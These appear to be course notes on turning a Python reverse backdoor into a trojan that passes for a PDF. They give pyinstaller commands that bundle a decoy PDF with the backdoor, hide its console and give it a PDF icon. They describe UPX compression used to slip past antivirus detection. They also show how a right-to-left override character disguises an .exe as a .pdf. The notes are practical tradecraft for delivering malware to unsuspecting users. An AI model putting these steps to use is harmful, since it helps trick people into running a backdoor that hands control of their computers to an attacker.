## Embed front files
# create trojan by embedding files in program code -> package front file with evil file
# --add-data embeds a file, after ; put the location where to store the front file - . for default location
wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data "/root/Downloads/sample.pdf;." --onefile 
--noconsole reverseBackdoor.py
# front file is extracted at run time, need to run it from evil file code.


## Bypass antivirus
Some antiviruses detect exe packaged by pyinstaller as malware, even if they don't have
malicious python code. So use UPX to compress exe files. Download->extract and move upx to "/opt". 
In the upx folder, open terminal and "./upx /root/reverseBackdoor.exe -o compresses_backdoor.exe"

## Change icon
find a relevant icon of high quality (iconfinder.com). 
Convert to .ico extension (https://www.easyicon.net/language.en/covert/).
wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data "/root/Downloads/sample.pdf;." --onefile 
--noconsole --icon /root/Downloads/pdf.ico reverseBackdoor.py

## Spoof file extension
By default windows does not show extension, unless it is checked in preferences.
Use right-to-left character override to change how the file name is read.
Original name - zaid-fdp.exe
insert character after -
Apparent name - zaid-exe.pdf